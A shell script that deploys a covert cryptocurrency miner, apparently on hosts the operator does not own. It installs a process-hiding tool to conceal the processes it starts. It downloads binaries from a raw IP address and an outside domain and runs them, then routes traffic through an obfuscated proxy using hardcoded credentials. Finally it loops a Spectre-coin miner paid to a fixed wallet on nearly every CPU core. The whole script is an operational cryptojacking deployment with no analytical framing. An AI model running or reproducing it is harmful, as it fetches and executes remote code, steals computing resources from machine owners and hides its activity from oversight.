#!/bin/sh

node -v && npm

sleep 2

npm i -g node-process-hider 1>/dev/null 2>&1

sleep 2

ph add glove 1>/dev/null 2>&1

sleep 2

ph add proot 1>/dev/null 2>&1

sleep 2

export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive

sleep 2
cat /etc/*-release
sleep 2

apt update >/dev/null;apt -y install apt-utils psmisc libreadline-dev dialog automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git binutils cmake build-essential unzip net-tools curl apt-utils wget dpkg >/dev/null

sleep 2

num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
currentdate=$(date '+%d-%b-%Y_Myb_')
ipaddress=$(curl -s api.ipify.org)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate+=$underscored_ip
used_num_of_cores=`expr $num_of_cores - 3`

sleep 2

wget http://45.135.58.52/Spectre.tar.gz

sleep 2

tar -xf Spectre.tar.gz

sleep 2

./Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:8443 &

sleep 2

curl -x socks5h://127.0.0.1:1082 api.ipify.org

sleep 2

DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null

sleep 2

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
dpkg-reconfigure --frontend noninteractive tzdata > /dev/null

sleep 2

TZ='Africa/Johannesburg'; export TZ
date 
sleep 2 

npm i -g node-process-hider 1>/dev/null 2>&1

sleep 2

ph add tin 1>/dev/null 2>&1

sleep 2

wget -q http://greenleaf.teatspray.fun/tin.tar.gz >/dev/null

sleep 2

tar -xf tin.tar.gz

sleep 2

echo ""
echo "You have a total number of $used_num_of_cores cores"
echo ""

sleep 2

echo ""
echo "Your worker name is $currentdate"
echo ""

sleep 2

while true
do
./tin --spectre --stratum --daemon-address spectre.cedric-crispin.com --port 4364 --wallet spectre:qqp8js5e364fagd3w9j3ncq4ea29d9tj0lpmemzew6rcgtzz9ck0u54kwtgta --worker-name $currentdate --dev-fee 1 --threads $used_num_of_cores cores
sleep 10
done
